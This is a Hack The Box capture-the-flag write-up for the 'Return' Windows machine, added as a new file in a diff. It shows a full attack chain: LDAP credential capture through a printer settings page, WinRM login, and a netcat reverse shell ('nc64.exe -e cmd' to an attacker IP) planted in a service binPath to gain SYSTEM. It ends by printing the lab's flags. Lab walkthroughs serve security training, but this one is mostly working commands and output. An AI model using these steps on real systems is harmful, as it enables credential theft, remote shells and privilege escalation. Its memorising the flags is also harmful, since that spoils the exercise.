@@ -1,0 +1,285 @@
+HTB - RETURN - Windows - Printer Tracker
+The goal of this machine was to showcase a vulnerable printer with exposed web page that
+when given IP to issue a request would automatically send an LDAP bind request that would
+send out the printer's credentials. After obtaining the creds, we would be given winrm direct
+access to the machine meaning we could get a powershell on the box. 
+
+From then on we can check the printer accounts privilege's and see that we were part of 
+group that could stop and start certain services within the machine using the "sc.exe" command
+as an example. Then we would use this example to create a reverse shell and get back a system
+shell to our attack mahine by starting the newly created service with high privileges.
+
+We go to settings and see that we have the following 4 fields
+COMMANDS:
+=============================================================================================
+http://10.10.11.108/settings.php
+Server Address 	
+Server Port 	
+Username 	
+Password 
+=============================================================================================
+
+We can try and change these fields but first we check the type of request and reponse we get
+with BURP.
+
+When we hit the submit button, this is what we get before sending off the web request
+COMMANDS:
+=============================================================================================
+POST /settings.php HTTP/1.1
+Host: 10.10.11.108
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+Origin: http://10.10.11.108
+Connection: close
+Referer: http://10.10.11.108/settings.php
+Upgrade-Insecure-Requests: 1
+
+ip=printer.return.local
+=============================================================================================
+
+Only the ip paramter is sent, we can guess that we might get the printer to authenitcate to
+us if we change the IP to our attack IP address.
+
+So we that and see if we get a response by setting up netcat session listening on port 389
+sane as what was set in inital settings.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/return/nmap]
+└─$ nc -lnvp 389 
+listening on [any] 389 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.108] 62527
+0*`%return\svc-printer�
+                       1edFg43012!!
+
+=============================================================================================
+
+We get a connect back with a user and password we can no test the newly gained creds and 
+see if we can get into the box by listing shares and verifying if we can use evil-winrm.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/return]
+└─$ smbmap -H 10.10.11.108 -p '1edFg43012!!' -u svc-printer                     
+[+] IP: 10.10.11.108:445        Name: 10.10.11.108                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  READ ONLY       Remote Admin
+        C$                                                      READ, WRITE     Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/windows/return]
+└─$ crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'    
+SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
+HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
+WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
+=============================================================================================
+
+We can both list shares and use winrm. Great so let's use evil-winrm to get a shell.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/return]
+└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                     
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                       
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
+return\svc-printer
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
+=============================================================================================
+
+We can now go ahead and list all te privilges bestowed to the printer user.
+COMMANDS:
+=============================================================================================
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+There may be others of interest, but Server Operators jumps out immediately. This group can do a lot of things:
+
+    A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Default User Rights: Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilege
+=============================================================================================
+
+So now that we idenitifed the most vulnerable attack vector we will try to get netcat on the
+machine and set it up to run as a service to get us back a reverse shell to the attack machine
+
+COMMANDS:
+=============================================================================================
+wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
+=============================================================================================
+
+If we look at the "sc.exe" command we can edit an exisiting service with the config option
+COMMANDS:
+=============================================================================================
+ config----------Changes the configuration of a service (persistent).
+
+..
+..
+
+*Evil-WinRM* PS C:\programdata> sc.exe config 
+DESCRIPTION:
+        Modifies a service entry in the registry and Service Database.
+USAGE:
+        sc <server> config [service name] <option1> <option2>...
+
+OPTIONS:
+NOTE: The option name includes the equal sign.
+      A space is required between the equal sign and the value.
+      To remove the dependency, use a single / as dependency value.
+ type= <own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
+ start= <boot|system|auto|demand|disabled|delayed-auto>
+ error= <normal|severe|critical|ignore>
+ binPath= <BinaryPathName to the .exe file>
+
+=============================================================================================
+
+'binpPath' option allows us to do just that.
+COMMANDS:
+=============================================================================================
+*Evil-WinRM* PS C:\programdata> upload www/nc64.exe
+Info: Uploading www/nc64.exe to C:\programdata\nc64.exe
+
+                                                             
+Data: 60360 bytes of 60360 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\programdata> ls
+
+
+    Directory: C:\programdata
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d---s-        5/20/2021  12:07 PM                Microsoft
+d-----        9/27/2021   4:46 AM                Package Cache
+d-----        5/27/2021  12:47 AM                regid.1991-06.com.microsoft
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-r---        5/26/2021   2:36 AM                temp
+d-----        9/15/2018  12:19 AM                USOPrivate
+d-----        5/20/2021  12:11 PM                USOShared
+d-----        9/27/2021   4:46 AM                VMware
+-a----         7/4/2022   8:00 PM          45272 nc64.exe
+
+
+*Evil-WinRM* PS C:\programdata> C:\programdata\nc64.exe -e cmd 10.10.14.9 9001
+*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.9 9001"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\programdata> sc.exe start VSS
+
+
+=============================================================================================
+
+We can now get an elevated shell, thanks to the service being run in an elevated state.
+COMMANDS:
+=============================================================================================
+
+┌──(kali㉿kali)-[~/htb/windows/return/www]
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.108] 54848
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\Users
+cd c:\Users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3A0C-428E
+
+ Directory of c:\Users
+
+05/26/2021  01:51 AM    <DIR>          .
+05/26/2021  01:51 AM    <DIR>          ..
+09/27/2021  04:40 AM    <DIR>          Administrator
+05/26/2021  01:50 AM    <DIR>          Public
+05/26/2021  01:51 AM    <DIR>          svc-printer
+               0 File(s)              0 bytes
+               5 Dir(s)   8,711,094,272 bytes free
+
+c:\Users>cd Adminisrtator
+cd Adminisrtator
+The system cannot find the path specified.
+
+c:\Users>cd administrator
+cd administrator
+
+c:\Users\Administrator>cd desktop
+cd desktop
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+e65f36fadcf3b0c77d6b375420cc4394
+
+..
+..
+..
+
+PS C:\Users> cd svc-printer/desktop
+cd svc-printer/desktop
+PS C:\Users\svc-printer\desktop> cat user.txt
+cat user.txt
+ba3903e988cd921d292e8f4635f3e9f3
+
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
